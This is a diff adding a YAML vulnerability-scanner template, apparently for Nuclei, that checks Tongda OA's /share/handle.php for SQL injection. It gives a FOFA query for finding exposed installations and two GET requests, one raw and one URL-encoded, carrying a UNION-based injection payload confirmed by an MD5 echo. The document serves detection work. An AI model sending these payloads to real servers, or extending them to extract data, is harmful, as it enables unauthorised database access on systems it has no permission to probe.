@@ -1,0 +1,29 @@
+id: tongda-oa-share-handle-php-sqli
+ 
+info:
+  name: tongda-oa-share-handle-php-sqli
+  author: wuha
+  severity: high
+  tags: tongda,tongdaoa,sqli
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    veified: true
+
+variables:
+  num: '{{rand_int(100000,999999)}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/share/handle.php?_GET[module]=1'+and+1={`='`+1}+and+1=0+union+select+(select/**/md5({{num}}))--+'"
+      - "{{BaseURL}}/share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27"
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - '{{md5({{num}})}}'
+          - '"status":"1"'
+          - 'share_id='
+          - '"img_url":"'
+        condition: and 
